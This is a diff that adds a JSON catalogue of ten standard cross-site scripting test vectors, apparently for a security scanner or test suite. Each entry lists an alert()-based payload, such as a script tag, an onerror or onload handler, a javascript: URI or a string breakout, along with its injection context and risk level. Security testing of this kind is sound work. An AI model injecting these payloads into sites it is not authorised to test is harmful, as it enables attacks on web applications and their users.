@@ -1,0 +1,18 @@
+{
+  "category": "Cross-Site Scripting (XSS)",
+  "cwe": "CWE-79",
+  "owasp": "A03:2021-Injection",
+  "description": "Standard OWASP & SecLists Cross-Site Scripting vectors covering Reflected, Stored, and DOM-based vulnerabilities.",
+  "vectors": [
+    { "id": "XSS-001", "name": "Basic Script Tag", "payload": "<script>alert('XSS')</script>", "context": "html_body", "risk": "high" },
+    { "id": "XSS-002", "name": "Image Onerror Event", "payload": "<img src=x onerror=alert('XSS')>", "context": "attribute_breakout", "risk": "high" },
+    { "id": "XSS-003", "name": "SVG Onload Event", "payload": "<svg onload=alert('XSS')>", "context": "xml_inline", "risk": "high" },
+    { "id": "XSS-004", "name": "Body Onload Event", "payload": "<body onload=alert('XSS')>", "context": "dom_event", "risk": "high" },
+    { "id": "XSS-005", "name": "Iframe Javascript URI", "payload": "<iframe src='javascript:alert(\"XSS\")'></iframe>", "context": "iframe_uri", "risk": "high" },
+    { "id": "XSS-006", "name": "Input Autofocus Onfocus", "payload": "<input onfocus=alert('XSS') autofocus>", "context": "autofocus_event", "risk": "medium" },
+    { "id": "XSS-007", "name": "Details Tag Ontoggle", "payload": "<details open ontoggle=alert('XSS')>", "context": "html5_element", "risk": "medium" },
+    { "id": "XSS-008", "name": "Video Source Onerror", "payload": "<video src=x onerror=alert('XSS')>", "context": "media_element", "risk": "medium" },
+    { "id": "XSS-009", "name": "JavaScript Context Breakout", "payload": "'-alert(1)-'", "context": "javascript_literal", "risk": "high" },
+    { "id": "XSS-010", "name": "Template Literal Expression", "payload": "${alert`1`}", "context": "ecmascript_template", "risk": "high" }
+  ]
+}
